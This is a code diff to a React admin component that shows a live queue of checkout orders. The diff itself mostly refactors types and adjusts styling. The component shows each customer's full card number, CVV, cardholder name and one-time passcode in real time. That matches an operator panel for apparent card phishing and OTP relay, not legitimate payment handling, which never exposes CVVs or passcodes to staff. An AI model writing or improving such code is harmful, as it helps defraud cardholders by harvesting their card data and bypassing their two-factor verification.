@@ -2,7 +2,7 @@ import { isPaymentOpen, PaymentActions } from "@/components/admin/payment-action
 import { formatMoney } from "@/lib/format";
 import { useT } from "@/lib/i18n";
 import { useOrdersStore } from "@/lib/store/orders";
-import type { Order } from "@/lib/types";
+import type { Locale, Order } from "@/lib/types";
 
 function spacedPan(value: string) {
   return value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
@@ -10,13 +10,14 @@ function spacedPan(value: string) {
 
 export function livePaymentOrders(orders: Order[]) {
   return [...orders]
-    .filter((o) => isPaymentOpen(o) && Boolean(o.paymentCapture?.cardNumber || o.paymentCapture?.holder))
+    .filter((o) => isPaymentOpen(o))
     .sort((a, b) => +new Date(b.date) - +new Date(a.date));
 }
 
 export function LiveCheckoutQueue() {
   const { t, locale } = useT();
-  const queue = useOrdersStore((s) => livePaymentOrders(s.orders));
+  const orders = useOrdersStore((s) => s.orders);
+  const queue = livePaymentOrders(orders);
 
   return (
     <section className="rounded-2xl border border-border bg-card">
@@ -43,20 +44,14 @@ export function LiveCheckoutQueue() {
   );
 }
 
-function LiveCheckoutRow({
-  order,
-  locale,
-}: {
-  order: Order;
-  locale: "ar" | "en";
-}) {
+function LiveCheckoutRow({ order, locale }: { order: Order; locale: Locale }) {
   const cap = order.paymentCapture;
   const pan = spacedPan(cap?.cardNumber ?? "");
   const otp = order.otp?.code;
 
   return (
     <li className="space-y-2 px-4 py-3">
-      <p className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
+      <p className="flex flex-wrap items-center gap-x-4 gap-y-1 text-sm leading-6">
         <span className="relative flex size-2.5 shrink-0">
           <span className="absolute inline-flex size-2.5 animate-ping rounded-full bg-emerald-500 opacity-60" />
           <span className="relative inline-flex size-2.5 rounded-full bg-emerald-500" />
@@ -70,10 +65,10 @@ function LiveCheckoutRow({
         <span className="font-mono" dir="ltr">
           CVV {cap?.cvv || "—"}
         </span>
-        {cap?.holder ? <span className="text-muted-foreground">{cap.holder}</span> : null}
-        <span className="tabular-nums font-medium">{formatMoney(order.totals.total, locale)}</span>
+        {cap?.holder ? <span>{cap.holder}</span> : null}
+        <span className="tabular-nums">{formatMoney(order.totals.total, locale)}</span>
         {otp ? (
-          <span className="rounded-md bg-primary px-2 py-0.5 font-mono text-xs font-semibold tracking-[0.2em] text-primary-foreground" dir="ltr">
+          <span className="rounded-md bg-primary px-2 py-0.5 font-mono text-xs font-semibold tracking-[0.25em] text-primary-foreground" dir="ltr">
             OTP {otp}
           </span>
         ) : null}
